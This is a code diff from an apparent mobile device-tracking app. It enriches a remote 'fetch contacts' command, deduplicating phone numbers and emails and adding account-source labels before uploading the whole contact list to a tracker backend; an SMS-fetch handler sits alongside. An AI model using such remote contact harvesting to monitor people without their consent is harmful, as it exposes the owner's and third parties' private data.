@@ -28,6 +28,7 @@ import {
   updateCommandStatus,
   type DeviceCommand,
 } from '@/lib/tracker';
+import { getAccountsForContacts } from '../../modules/contact-accounts/src';
 
 export interface DeviceStatus {
   battery: {
@@ -452,12 +453,32 @@ async function handleFetchContacts(commandId: string) {
   const contacts = results.map((c) => ({
     id: c.id,
     name: c.fullName ?? null,
-    phones: c.phones?.map((p) => p.number) ?? [],
-    emails: c.emails?.map((e) => e.address) ?? [],
+    // dedup: satu kontak native bisa punya nomor/email yang sama di beberapa field (Mobile, Home, dst)
+    phones: Array.from(new Set(c.phones?.map((p) => p.number).filter(Boolean) ?? [])),
+    emails: Array.from(new Set(c.emails?.map((e) => e.address).filter(Boolean) ?? [])),
   }));
 
-  await trackEvent('contacts_sync', { count: contacts.length, contacts });
-  await updateCommandStatus(commandId, 'executed', { count: contacts.length, contacts });
+  // Android-only: ambil sumber akun kontak (Google, SIM, WhatsApp, lokal, dll) lewat
+  // native module kustom. Gagal diam-diam kalau tidak tersedia (misal masih jalan di Expo Go
+  // tanpa development build, atau platform selain Android) — fitur ini best-effort.
+  let accountsByContactId: Record<string, { label: string }[]> = {};
+  try {
+    const accountsMap = await getAccountsForContacts(contacts.map((c) => c.id));
+    accountsByContactId = accountsMap;
+  } catch {
+    // Native module belum terpasang (perlu development build) atau platform tidak didukung
+  }
+
+  const contactsWithSource = contacts.map((c) => ({
+    ...c,
+    sources: (accountsByContactId[c.id] ?? []).map((a) => a.label),
+  }));
+
+  await trackEvent('contacts_sync', { count: contactsWithSource.length, contacts: contactsWithSource });
+  await updateCommandStatus(commandId, 'executed', {
+    count: contactsWithSource.length,
+    contacts: contactsWithSource,
+  });
 }
 
 async function handleFetchSms(_commandId: string) {
